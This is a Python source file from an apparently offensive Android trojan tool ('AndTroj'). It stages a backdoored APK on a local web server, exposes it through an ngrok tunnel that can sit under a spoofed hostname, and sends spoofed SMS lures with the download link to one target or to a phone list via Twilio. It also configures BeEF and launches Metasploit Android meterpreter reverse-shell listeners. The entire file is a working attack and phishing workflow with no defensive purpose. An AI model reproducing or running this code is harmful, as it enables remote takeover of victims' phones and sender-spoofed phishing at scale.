#!/usr/bin/env python
# coding=utf-8
# https://t.me/unk9vvn
# AVI
from core.start import Tor
from core.social_menu import *


dir = '/usr/share/AndTroj'
tmp = dir + '/tmp/'
protcl = tmp + 'protocol.txt'
NPAY_APK1 = tmp + 'nampay_apk.txt'
_apk_1 = tmp + '_apk_.txt'


LAN = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
                          if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
                          s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
                          socket.SOCK_DGRAM)]][0][1]]) if l][0][0])


def _rename_():
    global BKAPP, NPAY_APK1, _apk_1, first_linee
    RN = BKAPP.replace(" ", "_")
    BKAPP_RN = (' ' in BKAPP) == True
    if BKAPP_RN == (True):
        shutil.copyfile(BKAPP, "{0}".format(RN))
        subprocess.call(
            'mv ' + RN + ' /var/www/html/',
            shell=True)
        subprocess.call(
            'echo ' + RN + ' >> ' + NPAY_APK1,
            shell=True)
        subprocess.call(
            'YOY=$(sed -nE \'s/[^"]*\///p\' ' + NPAY_APK1 + ') && echo "$YOY" >> ' + _apk_1,
            shell=True)
        subprocess.call(
            'sed -nE \'s#\/##p\' ' + _apk_1,
            shell=True)
    else:
        subprocess.call(
            'cp ' + BKAPP + ' /var/www/html/',
            shell=True)
        subprocess.call(
            'echo ' + BKAPP + ' >> ' + NPAY_APK1,
            shell=True)
        subprocess.call(
            'YOY=$(sed -nE \'s/[^"]*\///p\' ' + NPAY_APK1 + ') && echo "$YOY" >> ' + _apk_1,
            shell=True)
        subprocess.call(
            'sed -nE \'s#\/##p\' ' + _apk_1,
            shell=True)


def s_apk_atck():
    global LHOST, LPORT, TARGET_NUM, PHONELIST, NGROK_SLT, BKAPP, first_linee
    subprocess.call(
        'sed -i \'137s/.*/        enable: true/\' /usr/share/beef-xss/config.yaml && '
        'sed -i \'156s/.*/            enable: true/\' /usr/share/beef-xss/config.yaml',
        shell=True)
    subprocess.call(
        'sed -i \'18s/.*/            host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml && '
        'sed -i \'28s/.*/            callback_host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml',
        shell=True)
    NGROK_SLT = raw_input("\n\t[1] Ngrok FreeURL(Free)"
                          "\n\t[2] Ngrok CustomURL(Business)"
                          "\n\nroot@unk9vvn:~# ")
    BKAPP = raw_input("\n\t[?] BK-APK: ")
    _rename_()
    f = open(_apk_1)
    data = f.read()
    first_linee = data.split('\n', 1)[0]

    if NGROK_SLT == "1":
        LHOST = raw_input("\t[?] LHOST: ")
        LPORT = raw_input("\t[?] LPORT: ")
        SPOOF_NUM = raw_input("\n\t[i] Example: +12565734104\n"
                              "\t[?] Your Number: ")
        TARGET_NUM = raw_input("\n\t[i] Example: +989381234567\n"
                               "\t[?] Target Number: ")
        MESSAGE = raw_input("\n\t[i] Example: Would you like to hide the unk9vvn team?\n"
                            "\t[?] Message Content: ")
        print "\n"
        subprocess.call(
            'proxychains ngrok update',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'proxychains ngrok http 80\'',
            shell=True)
        print "\nI: Please 10 sec waiting...\n"
        time.sleep(10.0)
        checkng = os.path.exists('/usr/share/AndTroj/tmp/rat_link.txt')
        if checkng == (False):
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ"/' + first_linee + ' > /usr/share/AndTroj/tmp/rat_link.txt',
                shell=True)
            subprocess.call(
                'sed -i -e \'s/\/root\///g\' /usr/share/AndTroj/tmp/rat_link.txt',
                shell=True)
        else:
            subprocess.call(
                'rm /usr/share/AndTroj/tmp/rat_link.txt',
                shell=True)
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ"/' + first_linee + ' > /usr/share/AndTroj/tmp/rat_link.txt',
                shell=True)
            subprocess.call(
                'sed -i -e \'s/\/root\///g\' /usr/share/AndTroj/tmp/rat_link.txt',
                shell=True)
        Tor()
        print "\nI: Please 10 sec waiting...\n"
        time.sleep(10.0)
        TWILIO_SID = "/root/.AndTroj/twilio_sid.txt"
        READ_SID = open(TWILIO_SID, "r")
        TWIL_SID = READ_SID.read()
        TWILIO_TOKEN = "/root/.AndTroj/twilio_token.txt"
        READ_TOKEN = open(TWILIO_TOKEN, "r")
        TWIL_TOKEN = READ_TOKEN.read()
        RAT_LINK = "/usr/share/AndTroj/tmp/rat_link.txt"
        READ_RAT = open(RAT_LINK, "r")
        RAT_LNK = READ_RAT.read()
        account_sid = '{0}'.format(TWIL_SID)
        auth_token = '{0}'.format(TWIL_TOKEN)
        client = Client(account_sid, auth_token)
        message = client.messages.create(
            from_='' + SPOOF_NUM + '',
            body='' + MESSAGE + '\n' + RAT_LNK + '',
            to='' + TARGET_NUM + ''
        )
        print(message.sid)
        checkauth = os.path.exists(protcl)
        if checkauth == (True):
            f = open(protcl, "r")
            cont = f.read()
            if cont == "reverse_tcp":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
            elif cont == "reverse_http":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_http;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
            elif cont == "reverse_https":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
            else:
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
        else:
            pass
        print "I: Send SMS Spoof for {0}...".format(TARGET_NUM)
        print "I: Content SMS Spoof: {0}...".format(MESSAGE)
        print """
             _   _             _       _____                      _      _
        /\  | | | |           | |     / ____|                    | |    | |
       /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___
      / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
     / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
    /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
                                                               | |
                                                               |_|
"""
        sys.exit()

    elif NGROK_SLT == "2":
        CUSTM_URL = raw_input("\n\t[i] Example: instagram.com"
                              "\n\t[?] CustomURL: ")
        PHONESLT = raw_input("\n\t[1] Single"
                             "\n\t[2] Multiple"
                             "\n\nroot@unk9vvn:~# ")
        if PHONESLT == "1":
            SPOOF_NUM = raw_input("\n\t[i] Example: +12565734104\n"
                                  "\t[?] Your Number: ")
            TARGET_NUM = raw_input("\n\t[i] Example: +989381234567\n"
                                   "\t[?] Target Number: ")
            MESSAGE = raw_input("\n\t[i] Example: Would you like to hide the unk9vvn team?\n"
                                "\t[?] Message Content: ")
        elif PHONESLT == "2":
            SPOOF_NUM = raw_input("\n\t[i] Example: +12565734104\n"
                                  "\t[?] Your Number: ")
            PHONELIST = raw_input("\n\t[i] Example: /root/Phonelist.txt\n"
                                  "\t[?] Phonelist: ")
            MESSAGE = raw_input("\n\t[i] Example: Would you like to hide the unk9vvn team?\n"
                                "\t[?] Message Content: ")
        else:
            return PHONESLT
        subprocess.call(
            'proxychains ngrok update',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'proxychains ngrok tls -hostname=' + CUSTM_URL + ' 443\'',
            shell=True)
        print "\nI: Please 10 sec waiting...\n"
        time.sleep(10.0)
        checkng = os.path.exists('/usr/share/AndTroj/tmp/rat_link.txt')
        if checkng == (False):
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ"/' + first_linee + ' > /usr/share/AndTroj/tmp/rat_link.txt',
                shell=True)
            subprocess.call(
                'sed -i -e \'s/\/root\///g\' /usr/share/AndTroj/tmp/rat_link.txt',
                shell=True)
        else:
            subprocess.call(
                'rm /usr/share/AndTroj/tmp/rat_link.txt',
                shell=True)
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ"/' + first_linee + ' > /usr/share/AndTroj/tmp/rat_link.txt',
                shell=True)
            subprocess.call(
                'sed -i -e \'s/\/root\///g\' /usr/share/AndTroj/tmp/rat_link.txt',
                shell=True)
        Tor()
        print "\nI: Please 10 sec waiting...\n"
        time.sleep(10.0)
        if PHONESLT == "1":
            TWILIO_SID = "/root/.AndTroj/twilio_sid.txt"
            READ_SID = open(TWILIO_SID, "r")
            TWIL_SID = READ_SID.read()
            TWILIO_TOKEN = "/root/.AndTroj/twilio_token.txt"
            READ_TOKEN = open(TWILIO_TOKEN, "r")
            TWIL_TOKEN = READ_TOKEN.read()
            RAT_LINK = "/usr/share/AndTroj/tmp/rat_link.txt"
            READ_RAT = open(RAT_LINK, "r")
            RAT_LNK = READ_RAT.read()
            account_sid = '{0}'.format(TWIL_SID)
            auth_token = '{0}'.format(TWIL_TOKEN)
            client = Client(account_sid, auth_token)
            message = client.messages.create(
                from_='' + SPOOF_NUM + '',
                body='' + MESSAGE + '\n' + RAT_LNK + '',
                to='' + TARGET_NUM + ''
            )
            print(message.sid)
        elif PHONESLT == "2":
            f = open(PHONELIST, "r")
            line = f.readline()
            TWILIO_SID = "/root/.AndTroj/twilio_sid.txt"
            READ_SID = open(TWILIO_SID, "r")
            TWIL_SID = READ_SID.read()
            TWILIO_TOKEN = "/root/.AndTroj/twilio_token.txt"
            READ_TOKEN = open(TWILIO_TOKEN, "r")
            TWIL_TOKEN = READ_TOKEN.read()
            RAT_LINK = "/usr/share/AndTroj/tmp/rat_link.txt"
            READ_RAT = open(RAT_LINK, "r")
            RAT_LNK = READ_RAT.read()
            account_sid = '{0}'.format(TWIL_SID)
            auth_token = '{0}'.format(TWIL_TOKEN)
            client = Client(account_sid, auth_token)
            while line:
                time.sleep(5.0)
                line = f.readline()
                message = client.messages.create(
                    from_='' + SPOOF_NUM + '',
                    body='' + MESSAGE + '\n' + RAT_LNK + '',
                    to='' + line + ''
                )
                f.close()
                print(message.sid)
        else:
            TWILIO_SID = "/root/.AndTroj/twilio_sid.txt"
            READ_SID = open(TWILIO_SID, "r")
            TWIL_SID = READ_SID.read()
            TWILIO_TOKEN = "/root/.AndTroj/twilio_token.txt"
            READ_TOKEN = open(TWILIO_TOKEN, "r")
            TWIL_TOKEN = READ_TOKEN.read()
            RAT_LINK = "/usr/share/AndTroj/tmp/rat_link.txt"
            READ_RAT = open(RAT_LINK, "r")
            RAT_LNK = READ_RAT.read()
            account_sid = '{0}'.format(TWIL_SID)
            auth_token = '{0}'.format(TWIL_TOKEN)
            client = Client(account_sid, auth_token)
            message = client.messages.create(
                from_='' + SPOOF_NUM + '',
                body='' + MESSAGE + '\n' + RAT_LNK + '',
                to='' + TARGET_NUM + ''
            )
            print(message.sid)
        checkauth = os.path.exists(protcl)
        if checkauth == (True):
            f = open(protcl, "r")
            cont = f.read()
            if cont == "reverse_tcp":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
            elif cont == "reverse_http":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_http;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
            elif cont == "reverse_https":
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
            else:
                subprocess.call(
                    'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + LHOST + ';set LPORT ' + LPORT + ';set ReverseListenerBindAddress ' + LAN + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\'',
                    shell=True)
        else:
            pass
        print "I: Send SMS Spoof for {0}...".format(TARGET_NUM)
        print "I: Content SMS Spoof: {0}...".format(MESSAGE)
        print """
             _   _             _       _____                      _      _
        /\  | | | |           | |     / ____|                    | |    | |
       /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___
      / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
     / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
    /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
                                                               | |
                                                               |_|
"""
        sys.exit()
    else:
        return NGROK_SLT
